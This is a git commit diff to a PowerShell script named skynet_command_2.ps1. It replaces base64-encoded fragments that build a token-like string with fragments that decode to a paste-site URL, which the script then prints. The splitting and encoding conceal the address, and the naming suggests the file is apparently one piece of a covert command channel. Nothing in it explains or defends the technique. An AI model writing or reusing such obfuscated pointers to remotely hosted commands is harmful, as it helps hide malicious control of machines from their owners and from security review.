fa0105bb40822aded6b23d3e21a8d556477a3deb
NotJakeFromStateFarm <cyb3rjake@gmail.com>
2024-11-09 14:56:09 -0500

    Update skynet_command_2.ps1

--- skynet_command_2.ps1
+++ skynet_command_2.ps1
@@ -1,10 +1,4 @@
-$part2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UF9pbWlsTFNKYks="))
-$part3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Yk1nNA=="))
-$part4 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("d3oybg=="))
-$part5 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MkthOQ=="))
-$part6 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ekNZUw=="))
-$part7 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LWdNUQ=="))
-$part8 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WF9NQw=="))
-$part9 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("THc="))
-$output = $part2 + $part3 + $part4 + $part5 + $part6 + $part7 + $part8 + $part9
+$part1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9naG9zdGJpbi5zaXRlLw=="))
+$part2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cnV6cWk="))
+$output = $part1 + $part2
 Write-Output $output
